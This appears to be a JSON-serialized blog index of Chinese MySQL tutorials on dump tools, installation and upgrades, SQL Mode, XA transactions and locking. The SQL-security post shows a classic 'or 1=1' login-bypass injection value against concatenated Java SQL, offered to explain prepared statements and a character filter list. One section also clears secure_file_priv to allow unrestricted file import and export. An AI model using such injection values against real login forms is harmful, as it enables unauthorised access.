输出格式选项1234567891011121314151617181920# 使得输出结果简洁，不包括默认选项中的各种注释--compact # 使得输出文件中的insert语句包括字段名称，默认是不包括字段名称的-c, --complete-insert# 备份数据和建表语句-T, --tab=name# 域分隔符--fields-terminated-by=name# 域引用符-fields-enclosed-by=name# 域可选引用符--fields-optionally-enclosed-by=name# 转义字符--fields-escaped-by=name 在导出时可能会发生这个错误1290: The MySQL server is running with the --secure-file-priv option so it cannot execute this statement when executing &#39;SELECT INTO OUTFILE&#39; secure_file_priv参数用于限制LOAD DATA, SELECT …OUTFILE, LOAD_FILE()传到哪个指定目录。 secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。 secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。 secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。 查看 secure_file_priv 的值，默认为NULL，表示限制不能导入导出。1234567mysql&gt; show global variables like '%secure_file_priv%';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | NULL |+------------------+-------+1 row in set (0.00 sec) 因为 secure_file_priv 参数是只读参数，不能使用set global命令修改。 12mysql&gt; set global secure_file_priv=&apos;&apos;;ERROR 1238 (HY000): Variable &apos;secure_file_priv&apos; is a read only variable 解决方法：打开my.cnf 或 my.ini，加入以下语句后重启mysql。1secure_file_priv=&apos;&apos; 查看secure_file_priv修改后的值 1234567mysql&gt; show global variables like '%secure_file_priv%';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | |+------------------+-------+1 row in set (0.00 sec) 字符集选项--default-character-set=name可以设置导出的客户端字符集。导出的时候要确认客户端和数据库的字符集一致 其它选项 -F –flush-logs: 备份前刷新日志，加上此选项后，备份前将关闭旧日志，生成新日志，使得进行恢复的时候直接从新日志开始进行重做，大大方便恢复过程 -l –lock-tables：给所有表加读锁，可以在备份期间使用，时的数据无法被更新，从而使备份的数据保持一致性 MyISAM表热备份工具mysqlhotcopy是一个perl脚本，它使用lock tables，flush tables， cp或scp来快速备份数据库。他是备份数据库或单个表的最快途径。（因为时perl脚本，所以需要安装Perl的MySQL数据库接口包 1234567mysqlhotcopy db_name [/path/to/new_directory]mysqlhotcory db_name_1 ... db_name_n /path/to/new_directory--allowold: 如果备份路径下含有同名备份，则将旧的备份目录rename为目录名_old--addtodest: 如果备份路径下存在同名目录，则仅仅将新的文件夹入目录--noindices: 不备份所有的索引文件--flushlog: 表被锁定后刷新日志 数据导入工具mysqlimport是客户端数据导入工具，用来导入mysqldump加-T选项后导出的文本文件 数据库对象查看工具mysqlshow客户端对象查找工具，用来很快的查找存在哪些数据库，数据库中的表，表中的列或索引。 1234567891011121314--count：显示数据库和表的统计信息，如果不指定数据库，则显示每个数据库的名称、表数量、记录数量， 如果指定数据库，那么就会显示指定数据库中的表的名称，表数量，记录数量，如果指定数据库和表，则显示表的字段信息# 不指定数据库mysqlshow -u root -p# 指定数据库 mysqlshow -u root -p --count test# 指定数据库数据表 mysqlshow -u root -p --count test t -k, --keys：显示指定表中的所有索引，共显示两个部分，一个部分时指定表的表结构，另外一个部分是指定表的当前索引信息， 与执行`show full columns from emp; show index from table_name;`的返回的结果一致 -i, --status: 显示表的一些状态信息，与`show table status from database_name like table_name;`一致 错误代码查看工具123perror [options] [errorcode[errorcode...]]类似于`error:#`或者`Errcode: #`, `#`代表具体的错误号。perror的作用就是解释这些错误代码的详细含义","path":"2019/09/25/MySQL-常用工具/","date":"09-25","excerpt":"客户端连接工具连接工具是数据库管理员使用的最频繁的工具即mysql命令，这个mysql不是指MySQL服务/数据库，而是指连接数据库客户端工具。1234mysql [OPTIONS] [database]# OPTIONS mysql可用项，可以写多个，也可以不写# database 链接的数据库","tags":[]},{"title":"MySQL-高级安装和升级","text":"Linux/Unix平台下的安装安装包比较Linux的安装包分为RPM、二进制包和源码包 RPM 二进制 源码 优点 安装简单，适合初学者学习使用 安装简单，可以安装到任何路径下，灵活性好，一台服务器可以安装多个MySQL 可按需定制编译，最灵活，性能最好，一台服务器可以安装多个MySQL 缺点 需要单独下载客户端和服务器，安装路径不灵活，默认路径不能修改，一台服务器只能安装一个MySQL 已经经过编译，性能不如源码编译的好，不能灵活定制编译参数 安装过程较复杂，编译时间长 文件布局 /usr/bin(客户端程序和脚本)/usr/sbin (mysqld服务器)/var/lib/mysql(日志文件和数据库)/usr/include/mysql(包含头文件)/usr/lib/mysql(库文件)/usr/share/mysql(错误消息和字符集文件)/usr/share/sql-bench(基准程序) bin(客户端程序和mysqld服务器)data(日志文件和数据库)docs(文档和ChangeLog)include(包含头文件)lib(库文件)scripts(mysql_install_db脚本、用来安装系统数据库)share/mysql(错误的消息文件)sql-bench(基准程序) bin(客户端程序和脚本)include/mysql(包含头文件)info(info格式的文档)lib/mysql(库文件)libexec(mysql服务器)share/mysql(错误消息文件)sql-bench(基准程序和crash-me测试)var(数据库和日志文件) 安装RPM包通常只要下载server(MySQL-包类型[Server]-版本信息[社区|企业] -版本号(5.7.21) -0.操作系统类型[rhel3].CPU类型[i386].rpm)包和clientMySQL-包类型[Client]-版本信息[社区|企业] -版本号(5.7.21) -0.操作系统类型[rhel3].CPU类型[i386].rpm包就可以满足大部分的应用 12345678# 使用以下命令安装RPM文件rpm -ivh 文件名# -i, --install 表示对后面的RPM包进行安装# -v, --verbose 安装过程中提供更多的输出信息# -h, --hash 打印字符#来进行安装进度的提示# 查看rpm命令信息rpm --help 安装二进制包如果不想安装最简单却不够灵活的RPM包，又不想安装复杂费时的源码包，那么就可以安装已经编译好的二进制包 用root登录操作系统，增加mysql用户和组，数据库将安装在此用户下 1234# 增加用户组groupadd mysql# 增加用户useradd -g mysql mysql 解压二进制安装包，假设安装文件放在/home/mysql，并对解压后的mysql目录加一个符号链接’mysql’,这样对mysql目录操作会更方便 123456# 进入解压的目录cd /home/mysql# 解压安装包tar -zxvf /home/mysql/mysql-version-os.tar.gz# 制作软链ln -s mysql-version-os mysql 在数据目录下创建系统数据库和系统表，–user表示这些数据库和表的owner是此用户 12chown -R root:mysql .chown -R mysql:mysql data 设置目录权限,将data目录owner改为mysql，其他目录和文件为root 12chown -R root:mysql .chown -R mysql:mysql data 启动MySQL 1bin/mysqld_safe --user=mysql &amp; 安装源码包如果对数据库的性能要求很高，并且希望能够灵活的定制安装选项，安装源码包将是最好的选择。 用root登录操作系统，增加mysql用户和组，数据库将安装在此用户下 1234# 增加用户组groupadd mysql# 增加用户useradd -g mysql mysql 解压源码安装文件mysql-VERSION.tar.gz,并进入解压后的目录 12gunzip &lt; mysql-VERSION.tar.gz | tar -xvf -cd mysql-VERSION 用configure工具来编译源码 1234# 安装到/usr/local/mysql 目录下， configure的参数可以通过configure --help查看./configure --prefix=/usr/local/mysqlmakemake install 选择一个MySQL自带的样例配置文件，并cp到/etc/ 下改名为my.cnf 123cp support-files/my-medium.cnf /etc/my.cnf# 可以自定义一些配置 在数据目录创建系统数据库和系统表 –user标识这些数据库和表的owner是此用户 12cd /usr/local/mysqlbin/mysql_install_db --user=mysql 设置目录权限，将var目录owner改为mysql（源码安装默认数据目录为var），其他目录和文件为root 123chown -R root .chown -R mysql varchgrp -R mysql . 启动MySQL 1bin/mysql_safe --user=mysql &amp; 参数设置方法MySQL参数的初始化是通过参数文件进行设置，如果不设置参数文件，MySQL就按照系统中所有参数的默认值来进行启动，通过mysqld -verbose --help命令可以来查看参数文件中所有参数的当前设置值 参数文件可以被放在多个位置，数据库启动的时候将按照不同的顺序来搜索，如果在多个位置都有参数文件，则搜索顺序靠后的文件中的参数将覆盖靠前的文件参数 Windows平台MySQL参数文件读取顺序 文件名 备注 WINDIR\\my.ini 全局选项 C:\\my.cnf 全局选项 INSTALLDIR\\my.ini 全局选项 defauls-extra-file 用–defaults-extra-file=path指定的文件 Linux平台MySQL参数文件读取顺序 文件名 备注 /etc/my.cnf 全局选项 $MYSQL_HOME/my.cnf 服务器相关选项，其中$MYSQL_HOME为环境变量中指定的MySQL安装目录 defaults-extra-file 用–defaults-extra-file=path指定的文件 ~/.my.cnf 用户相关选项 WINDIR: 可以通过windows的echo %WINDIR%命令查看 INSTALLDIR：是mysql的安装目录 defaults-extra-file是MySQLMySQL启动时可选的选项，可以指定任何路径下的配置文件 全局选项表示如果一台服务器上安装了多了MySQL，则每个MySQL服务启动的时候都会首先从此选项中读取参数 可以从mysql安装目录下复制一个配置文件，然后根据自己的需要进行修改 session级修改（只对本session有效）： 1set para_name=value; 全局级修改（对所有新的连接都有效，但是对本session无效，重启后此配置失效 1set global para_name=value; 永久修改 对my.cnf进行增加或者修改，重启后依然有效 源码包安装性能考虑去除不需要模块查看所有编译的配置选项 12345678910111213./configure -help# 如果只是安装客户端./configure --without-server# 如果安装的目录想安装在其他地方./configure --prefix=/usr/local/mysql/# 保留默认安装前缀，但是覆盖数据库目录的默认目录, 通常是/usr/local/var,并且把它改为/usr/local/mysql/data./configure --prefix=/usr/local localstatedir=/usr/local/mysql/data# 编译完后可以通过选项文件更送这些选项./configure --with-unix-socket-path=/usr/local/mysql/tmp/mysql.sock 只选择要使用的字符集MySQL使用LATIN1和HATIN1_SWEDISH_CI作为默认的字符集和校对规则。 12345678910# 编译时修改默认的字符集和校对集# 设置字符集./configure --with-charset=[CHARSET]# 设置校对规则./configure --with-collation=[COLLATION]# 只安装用户需要的字符集 LIST是以空格为间隔的一些列字符集名， complex以不包括不能动态装载的所有字符集 all包括所有字符集./configure --with-extra-charsets=LIST 使用静态编译以提高性能使用静态编译将大大提高MySQL的性能 123# --with-client-ldflags=-all-static 以纯静态方式编译客户端# --with-mysqld-ldflags=-all-static 以纯静态方式编译服务端./configure --with-client-ldflags=-all-static --with-mysqld-ldflags=-all-static MySQL升级适合任何存储引擎最简升级，速度不一定最快 在目标服务器上安装新版本的MySQL 在新版本的MySQL上创建和老版本相同名的数据库 1mysqladmin -h hostname -P prot -u user -p password create db_name 将老版本MySQL上的数据库通过管道导入到新版本数据库中 12# 采用优化方式进行导出mysqldump --opt db_name | mysql -h hostname -P port -u user -p passed db_name 将旧版本MySQL中的MySQL目录全部cp过来覆盖新版本MySQL中的MySQL数据库 1scp -R /var/lib/mysql user@hostname:/var/lib/mysql 新版本服务器的shell里面执行mysql_fix_privilege_tables命令升级权限表 1mysql_fix_privilege_tables 重启新版本MySQL服务 速度较快 安装最新版本MySQL 在旧版本MySQL中，创建用来保存输出文件的目录并用mysqldump备份数据库 123mkdir DUMPDIR# 使用--tab不会生成SQL文本。在备份目录下对每个表分别生成.sql和.txt文件，其中.sql保存了表的创建语句， .txt保存了默认分隔符生成的存数据文本mysqldump --tab=DUMPDIR db_name 将DUMPDIR目录中的文件转移到目标服务器上相应的目录中并将文件装载到新版本的MySQL中 123456# 创建数据库mysqladmin create db_name# 创建数据库表cat DUMPDIR/*.sql | mysql db_name# 加载数据mysqlimport db_name DUMPDIR/.txt 升级权限表 12345# 将旧版本MySQL中的MySQL目录全部cp过来覆盖新版本MySQL中的MySQL数据库scp -R /var/lib/mysql user@hostname:/var/lib/mysql# 升级权限表mysql_fix_privilege_tables 重启数据库 适用于MyISAM存储引擎，速度最快 安装新数据库 将旧版本MySQL中的数据目录下的所有文件(.frm、.MYD、.MYI)拷贝到新版本MySQL下的相应目录下 升级权限表 12345# 将旧版本MySQL中的MySQL目录全部cp过来覆盖新版本MySQL中的MySQL数据库scp -R /var/lib/mysql user@hostname:/var/lib/mysql# 升级权限表mysql_fix_privilege_tables 重启数据库 以上升级建立在旧版本MySQL不再进行数据更新，否则迁移过去的数据库将不能保证和源数据库一直 迁移前后的数据库字符集最好能保持一致，否则可能会出现各种各样的乱码问题 MySQL官方升级文档","path":"2019/09/19/MySQL-高级安装和升级/","date":"09-19","excerpt":"Linux/Unix平台下的安装安装包比较Linux的安装包分为RPM、二进制包和源码包 RPM 二进制 源码 优点 安装简单，适合初学者学习使用 安装简单，可以安装到任何路径下，灵活性好，一台服务器可以安装多个MySQL 可按需定制编译，最灵活，性能最好，一台服务器可以安装多个MySQL 缺点 需要单独下载客户端和服务器，安装路径不灵活，默认路径不能修改，一台服务器只能安装一个MySQL 已经经过编译，性能不如源码编译的好，不能灵活定制编译参数 安装过程较复杂，编译时间长 文件布局 /usr/bin(客户端程序和脚本)/usr/sbin (mysqld服务器)/var/lib/mysql(日志文件和数据库)/usr/include/mysql(包含头文件)/usr/lib/mysql(库文件)/usr/share/mysql(错误消息和字符集文件)/usr/share/sql-bench(基准程序) bin(客户端程序和mysqld服务器)data(日志文件和数据库)docs(文档和ChangeLog)include(包含头文件)lib(库文件)scripts(mysql_install_db脚本、用来安装系统数据库)share/mysql(错误的消息文件)sql-bench(基准程序) bin(客户端程序和脚本)include/mysql(包含头文件)info(info格式的文档)lib/mysql(库文件)libexec(mysql服务器)share/mysql(错误消息文件)sql-bench(基准程序和crash-me测试)var(数据库和日志文件)","tags":[]},{"title":"MySQL-SQL Mode","text":"什么时SQL ModeSQL Mode是SQL模式，定义了MySQL应支持的SQL语法，数据校验等。 方便在不同环境中使用MySQLSQL Mode一般常用来解决以下问题 可以完成不同严格程度的数据校验，有效的保障数据准确性 如果设置为ANSI模式，可以保证大多数的SQL符合标准的SQL语法，这样应用在不同类型的数据库之间进行迁移时不需要对业务的SQL进行较大的修改 可以更方便的在不同数据库之间进行迁移 12345678# 查看默认的SQL Modeselect @@sql_mode;# 设置SQL Mode，STRICT_TRANS_TABLE这是严格模式set [session|GLOBAL] sql_mode='STRICT_TRANS_TABLES'# SESSION代表本次连接中生效# GLOBAL代表在本次连接中不生效，对于新的连接生效# 可以在配置文件中添加 --sql-mode=\"modes\" 在启动时就设置好 SQL Mode的常见功能校验日期数据合法性12# 设置严格模式set session sql_mode=\"ANSI\"; 严格数学运算在INSERT或UPDATE过程中，如果SQL Mode处于严格模式下，那么运行MOD(X , 0)这样的错误运算就会报错，非严格模式下运行则会返回NULL 1234567891011121314# ANSI是非严格模式， TRADITIONAL是严格模式create table t(d int);set session sql_mode=\"ANSI\";insert into t values(9%0);select * from t; +--------+| d |+--------+| &lt;null&gt; |+--------+set session sql_mode=\"TRADITIONAL\";mysql root@localhost:test&gt; insert into t values(9%0); (1365, 'Division by 0') NO_BACKSLASH_ESCAPES使反斜线成为普通字符如果导入数据时数据中含有反斜线字符，启用这个模式可以保证数据的正确性。 12345678910111213141516171819202122232425262728293031323334# 非NO_BACKSLASH_ESCAPES模式下set sql_mode='ansi';create table t(context varchar(20));insert into t values('\\beijing'); mysql root@localhost:test&gt; select * from t; +---------+| context |+---------+| ^Heijing |+---------+mysql root@localhost:test&gt; insert into t values('\\\\beijing');mysql root@localhost:test&gt; select * from t;+----------+| context |+----------+| ^Heijing || \\beijing |+----------+# 设置NO_BACKSLASH_ESCAPES模式set sql_mode='REAL_AS_FLOAT,PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,ANSI,NO_BACKSLASH_ESCAPES'; SELECT @@SQL_MODE \\G ***************************[ 1. row ]***************************@@SQL_MODE | REAL_AS_FLOAT,PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,ONLY_FULL_GROUP_BY,ANSI,NO_BACKSLASH_ESCAPESinsert into t values('\\\\beijing');SELECT * FROM t;+-----------+| context |+-----------+| ^Heijing || \\beijing || \\\\beijing |+-----------+# 可以看到反斜线变成了普通字符， 如果导入的数据中含有反斜线，可以设置此模式保证数据的正确性 启用PIPES_AS_CONCAT兼容Oracle等数据库的字符串连接操作符在Oracle等数据库中’||’符号为字符串的连接操作符，但是||无法在MySQL中执行，PIPES_AS_CONCAT可以解决这个兼容问题 12345678910select @@sql_mode; ***************************[ 1. row ]***************************@@sql_mode | REAL_AS_FLOAT,PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,ONLY_FULL_GROUP_BY,ANSIselect 'beijing'||'2008';+-------------------+| 'beijing'||'2008' |+-------------------+| beijing2008 |+-------------------+ 常用的SQL Mode SQL Mode 描述 ANSI 等同于REAL_AS_FLOAT,PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE和ANSI组合模式，这种模式使语法更符合标准的SQL STRICT_TRANS_TABLES STRICT_TRANS_TABLES适用于事务表和非事务表，它是严格模式，不允许非法日期，也不允许超过字段长度的值插入字段中，对于不正确的值给出错误而不是警告 TRADITIONAL 由STRICT_TRANS_TABLES,STRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,TRADITIONAL,NO_AUTO_CREATE_USER组成，所以也是严格模式，对于插入不正确的值会给出错误而不是警告，可以应用在事务表和非事务表，用在事务表时，只要出现错误就会立即回滚 第一列中的SQL Mode是一些原子模式的组合，通常只要设置一个模式组合就可以设置多个原子模式。 SQL Mode在迁移时的使用 组合后的模式名称 组合模式中的各个SQL Mode DB2 PIPES_AS_CONCAT、ANSI_QUOTES、IGNORE_SPACE、NO_KEY_OPTIONS、NO_TABLE_OPTIONS、NO_FIELD_OPTIONS MAXDB PIPES_AS_CONCAT、ANSI_QUOTES、IGNORE_SPACE、NO_KEY_OPTIONS、NO_TABLE_OPTIONS、NO_FIELD_OPTIONS、NO_AUTO_CREATE_UESR MSSQL PIPES_AD_CONCAT、ANSI_QUOTES、IGNORE_SPACE、NO_KEY_OPTIONS、NO_TABLE_OPTIONS、NO_FIELD_OPTIONS ORACLE PIPES_AS_CONCAT、ANSI_QUOTES、IGNORE_SPACE、NO_KEY_OPTIONS、NO_TABLE_OPTIONS、NO_FIELD_OPTIONS、NO_AUTO_CREATE_USER POSTGRESQL PIPES_AS_CONCAT、ANSI_QUOTES、IGNORE_SPACE、NO_KEY_OPTIONS、NO_TABLE_OPTIONS、NO_FIELD_OPTIONS 在数据迁移过程中，可以设置SQL Mode为NO_TABLE_OPTIONS模式，这样将去掉engine关键字，获得通用的建表脚本 1234567891011121314151617show create table t; +-------+--------------------------------------+| Table | Create Table |+-------+--------------------------------------+| t | CREATE TABLE `t` ( || | `context` varchar(20) DEFAULT NULL || | ) ENGINE=InnoDB DEFAULT CHARSET=utf8 |+-------+--------------------------------------+set sql_mode='no_table_options'; show create table t;+-------+--------------------------------------+| Table | Create Table |+-------+--------------------------------------+| t | CREATE TABLE `t` ( || | `context` varchar(20) DEFAULT NULL || | ) |+-------+--------------------------------------+","path":"2019/09/19/MySQL-SQL Mode/","date":"09-19","excerpt":"什么时SQL ModeSQL Mode是SQL模式，定义了MySQL应支持的SQL语法，数据校验等。 方便在不同环境中使用MySQLSQL Mode一般常用来解决以下问题 可以完成不同严格程度的数据校验，有效的保障数据准确性 如果设置为ANSI模式，可以保证大多数的SQL符合标准的SQL语法，这样应用在不同类型的数据库之间进行迁移时不需要对业务的SQL进行较大的修改 可以更方便的在不同数据库之间进行迁移","tags":[]},{"title":"MySQL-SQL中的安全问题","text":"SQL注入SQL注入时利用某些数据库的外部接口将用户数据插入到实际的数据库操作语言中，从而达到入侵数据库乃至操作系统的目的。产生的主要原因是由于程序对用户输入的数据没有进行严格的过滤，导致非法数据库查询语句的执行 SQL注入攻击具有很大的危害，攻击者可以利用它读取、修改或者删除数据库内的数据，获取数据库中的用户名和密码等敏感信息，设置可以获得数据库管理员的权限，而且SQL注入无法通过安装系统补丁或者进行简单的安全配置进行自我保护，一般的防火墙也无法拦截SQL注入攻击 12345678910111213// java代码中设置sql登录语句String sql = \"select * from user where username='\"+username +\"' and password='\"+password+\"'\";Statement stmt = conn.createStatement();//选择import java.sql.ResultSet;ResultSet rs = stmt.executeQuery(sql);/** * &lt;p&gt;如果按照上述方式做登录验证， 则用户名传入 &lt;strong&gt;username' or 1=1 '&lt;/strong&gt;时一样可以登录&lt;/p&gt; * &lt;p&gt; 因为最终组成的语句是 select * from user where username='xxx' or 1=1 '' and password='xxx' ，利用单引号直接插入了一个新的判断 or 1=1&lt;/p&gt; * 在数据库中，会直接碰撞到用户名为xxx的，因为or 1=1成功后，就不需要验证password了 */ 开发中可以采取的应对措施PrepareStatement+Bind-variable12345678910String sql = \"select * from user where username=? and passwrod=?\";PrepareStatement prepStmt = conn.prepareStatment(sql);prepStmt.setString(1,\"xxx' or 1=1 '\");prepStmt.setString(2, \"xxx\");prepStmt.executeQuery();/** * &lt;p&gt;这样代码在数据库中真正执行的是 select * from user where username = 'xxx\\' or 1=1 \\'' and password = 'test'; ,这样子 or 1=1 就发挥不出作用了&lt;/p&gt; * &lt;p&gt; 同时， 这种方法对/*或者# 等方式试图令后续条件失效也是会失败的&lt;/p&gt; */ 自定义函数进行校验自定义函数可以分为：1. 整理数据使之变得有效、2. 拒绝已知的非法输入、3. 只接受已知的合法输入 已知的非法符号有 ‘ ; = ( ) /* */ % + 空格 > &lt; -- [ ] 只要过滤（可以通过正则）这些非法的符号组合就可以阻止已知形式的攻击，如果发现了新的攻击符号组合，也可以将这些符号组合添进来。特别是空格符号和与其产生相同作用的分隔关键字的符号，例如/**/，如果成功过滤这种符号，那么有很多注入攻击将不能发生，并且同时也要过滤他们的十六进制标识 %XX","path":"2019/09/17/MySQL-SQL中的安全问题/","date":"09-17","excerpt":"SQL注入SQL注入时利用某些数据库的外部接口将用户数据插入到实际的数据库操作语言中，从而达到入侵数据库乃至操作系统的目的。产生的主要原因是由于程序对用户输入的数据没有进行严格的过滤，导致非法数据库查询语句的执行","tags":[]},{"title":"MySQL5.7.9完美的分布式事务支持","text":"转载于：boyceTwo Phase Commit Protocol分布式事务通常采用2PC协议，全称Two Phase Commitment Protocol。该协议主要为了解决在分布式数据库场景下，所有节点间数据一致性的问题。在分布式事务环境下，事务的提交会变得相对比较复杂，因为多个节点的存在，可能存在部分节点提交失败的情况，即事务的ACID特性需要在各个数据库实例中保证。总而言之，在分布式提交时，只要发生一个节点提交失败，则所有的节点都不能提交，只有当所有节点都能提交时，整个分布式事务才允许被提交。 分布式事务通过2PC协议将提交分成两个阶段： repare； commit/rollback 第一阶段的prepare只是用来询问每个节点事务是否能提交，只有当得到所有节点的“许可”的情况下，第二阶段的commit才能进行，否则就rollback。需要注意的是：prepare成功的事务，则必须全部提交。 MySQL分布式事务一直以来，MySQL数据库是支持分布式事务的，但是只能说是有限的支持，具体表现在： 已经prepare的事务，在客户端退出或者服务宕机的时候，2PC的事务会被回滚 在服务器故障重启提交后，相应的Binlog被丢失 上述问题存在于MySQL数据库长达数十年的时间，直到MySQL-5.7.7版本，官方才修复了该问题。 虽然InnoSQL早已在5.5版本修复，但是对比官方的修复方案，我们真的做的没有那么的优雅 。下面将会详细介绍下该问题的具体表现和官方修复方法，这里分别采用官方MySQL-5.6.27版本(未修复)和MySQL-5.7.9版本(已修复)进行验证。 先来看下存在的问题，我们先创建一个表如下： 1234create table t( id int auto_increment primary key, a int)engine=innodb; 对于上述表，通过如下操作进行数据插入： 1234mysql&gt; XA START 'mysql56';mysql&gt; INSERT INTO t VALUES(1,1);mysql&gt; XA END 'mysql56';mysql&gt; XA PREPARE 'mysql56' 通过上面的操作，用户创建了一个分布式事务，并且prepare没有返回错误，说明该分布式事务可以被提交。通过命令XA RECOVER查看显示如下结果： 123456mysql&gt; XA RECOVER;+----------+--------------+--------------+---------+| formatID | gtrid_length | bqual_length | data |+----------+--------------+--------------+---------+| 1 | 7 | 0 | mysql56 |+----------+--------------+--------------+---------+ 若这时候用户退出客户端后重连，通过命令xa recover会发现刚才创建的2PC事务不见了。 即prepare成功的事务丢失了，不符合2PC协议规范！！！ 产生上述问题的主要原因在于：MySQL-5.6版本在客户端退出的时候，自动把已经prepare的事务回滚了，那么MySQL为什么要这样做？这主要取决于MySQL的内部实现，MySQL-5.7以前的版本，对于prepare的事务， MySQL是不会记录binlog的 (官方说是减少fsync，起到了优化的作用)。只有当分布式事务提交的时候才会把前面的操作写入binlog信息，所以对于binlog来说， 分布式事务与普通的事务没有区别 ，而prepare以前的操作信息都保存在连接的IO_CACHE中，如果这个时候客户端退出了，以前的binlog信息都会被丢失，再次重连后允许提交的话，会造成Binlog丢失，从而造成主从数据的不一致，所以官方在客户端退出的时候直接把已经prepare的事务都回滚了！ 官方的做法，貌似干得很漂亮，牺牲了一点标准化的东西，至少保证了主从数据的一致性。但其实不然，若用户已经prepare后在客户端退出之前，MySQL发生了宕机，这个时候又会怎样？ MySQL在某个分布式事务prepare成功后宕机，宕机前操作该事务的连接并没有断开，这个时候已经prepare的事务并不会被回滚，所以在MySQL重新启动后，引擎层通过recover机制能恢复该事务。当然该事务的Binlog已经在宕机过程中被丢失，这个时候，如果去提交，则会造成主从数据的不一致， 即提交没有记录Binlog，从上丢失该条数据。 所以对于这种情况，官方一般建议直接回滚已经prepare的事务。 以上是MySQL-5.7以前版本MySQL在分布式事务上的各种问题，那么MySQL-5.7版本官方做了哪些改进？这个可以从官方的 WL#6860 描述上得到一些信息，我们还是本着没有实践就没有发言权的态度，从具体的操作上来分析下MySQL-5.7的改进方法： 还是以上面同样的表结构进行同样的操作如下： 1234mysql&gt; XA START 'mysql57';mysql&gt; INSERT INTO t VALUES(1,1);mysql&gt; XA END 'mysql57';mysql&gt; XA PREPARE 'mysql57' 这个时候，我们通过mysqlbinlog来查看下Master上的Binlog，结果如下： 同时也对比下Slave上的Relay log，如下： 通过上面的操作，明显发现在prepare以后，从XA START到XA PREPARE之间的操作都被记录到了Master的Binlog中，然后通过复制关系传到了Slave上。也就是说MySQL-5.7开始，MySQL对于分布式事务，在prepare的时候就完成了写Binlog的操作，通过新增一种叫 XA_prepare_log_event 的event类型来实现，这是与以前版本的主要区别(以前版本prepare时不写Binlog) 当然仅靠这一点是不够的，因为我们知道Slave通过SQL thread来回放Relay log信息，由于prepare的事务能阻塞整个session，而回放的SQL thread只有一个(不考虑并行回放)，那么SQL thread会不会因为被分布式事务的prepare阶段所阻塞，从而造成整个SQL thread回放出现问题？这也正是官方要解决的第二个问题：怎么样能使SQL thread在回放到分布式事务的prepare阶段时，不阻塞后面event的回放？其实这个实现也很简单(在xa.cc::applier_reset_xa_trans)，只要在SQL thread回放到prepare的时候，进行类似于客户端断开连接的处理即可(把相关cache与SQL thread的连接句柄脱离)。最后在Slave服务器上，用户通过命令XA RECOVER可以查到如下信息： 123456mysql&gt; XA RECOVER;+----------+--------------+--------------+---------+| formatID | gtrid_length | bqual_length | data |+----------+--------------+--------------+---------+| 1 | 7 | 0 | mysql57 |+----------+--------------+--------------+---------+ 至于上面的事务什么时候提交，一般等到Master上进行 XA COMMIT ‘mysql57’ 后，slave上也同时会被提交。 总结综上所述，MySQL 5.7对于分布式事务的支持变得完美了，一个长达数十年的bug又被修复了，因而又多了一个升级到MySQL-5.7版本的理由。","path":"2019/09/17/MySQL5-7-9完美的分布式事务支持/","date":"09-17","excerpt":"转载于：boyceTwo Phase Commit Protocol分布式事务通常采用2PC协议，全称Two Phase Commitment Protocol。该协议主要为了解决在分布式数据库场景下，所有节点间数据一致性的问题。在分布式事务环境下，事务的提交会变得相对比较复杂，因为多个节点的存在，可能存在部分节点提交失败的情况，即事务的ACID特性需要在各个数据库实例中保证。总而言之，在分布式提交时，只要发生一个节点提交失败，则所有的节点都不能提交，只有当所有节点都能提交时，整个分布式事务才允许被提交。","tags":[]},{"title":"MySQL-事务控制和锁定语句","text":"LOCK TABLE &amp; UNLOCK TABLE LOCK TABLE：可以锁定当前线程的表，如果表被其他线程锁定，则当前线程会等待到可以获取锁定为止 UNLOCK TABLE：可以释放当前线程获得的任何锁定， 但是当前线程执行LOCK TABLE其他表的时候或者当前连接被关闭的时候，所有由当前线程锁定的表被隐含的解锁 client 1 client 2 lock table t read; select * from t;+———–+/ f /+———–+/ 1.2 // 1234567.2 /+———–+ 更新锁定表等待获得锁update t set f = 1.3 where f = 1.2; unlock tables; 获得锁，更新操作完成Query OK, 1 row affected 事务控制MySQL默认是自动提交（Autocommit），如果需要通过明确Commit和Rollback来提交和回滚事务，那么就需要通过明确的事务控制命令来开始事务 1234START TANSACTION | BEGIN [WORK]COMMIT [WORK] [AND [NO] CHAIN] [[NO] RELEASE]ROLLABCK [WORK] [AND [NO] CHAIN] [[NO] RELEASE]SET AUTOCOMMIT=&#123;0\\1&#125; START TRANSACTION 或 BEGIN语句可以开始一项新的事务 COMMIT 和 ROLLBACK 用来提交或者回滚事务 CHAIN 和 RELEASE子句分别用来定义在事务提交或者回滚之后的操作，CHAIN会立即启动一个新事物，并且和刚才的事务具有相同的隔离级别，RELEASE则会断开和客户端的连接 SET AUTOCOMMIT可以修改当前连接的提交方式， 如果设置了SET AUTOCOMMIT=0， 则设置之后的所有事务都需要通过明确的命令进行提交或回滚 如果只是对某些语句需要进行事务控制，则使用START TRANSACTION语句开始一个事务比较方便，这样事务结束之后可以自动回到自动提交事务的方式（如果事务中使用了COMMIT AND CHAIN，那么会在提交后立即开始一个新的事务），如果希望所有的事务都不是自动提交的，那么通过修改 AUTOCOMMIT来控制事务比较方便，这样不用在每个事务开始的时候再执行START TRANSACTION语句 client 1 client 2 select * from t where f = 1.5;+—+/ f /+—+ select * from t where f = 1.5;+—+/ f /+—+ 开始一个事务start transaction;insert into t values(1.5); client 1的insert 并没有插入select * from t where f = 1.5;+—+/ f /+—+ commit; select * from t where f=1.5; +—–+/ f /+—–+/ 1.5 /+—–+ 重新用 start transaction启动一个事务start transaction;插入一条记录insert into t values(1.1);使用commit and chain提交，提交后立即开始一个新的事务commit and chain;insert into t values(1.2); 第一次插入的数据已经看到了select * from t ; +—–+/ f /+—–+/ 1.1 /+—–+ commit; select * from t ; +—–+/ f /+—–+/ 1.1 // 1.2 /+—–+ 实行start transaction命令开始一个事务的时候，会造成一个隐含的unlock tables被执行 client 1 client 2 lock table t write; select * from t;# 等待 start transaction; select * from t;+—+/ f /+—+ # t表被解锁 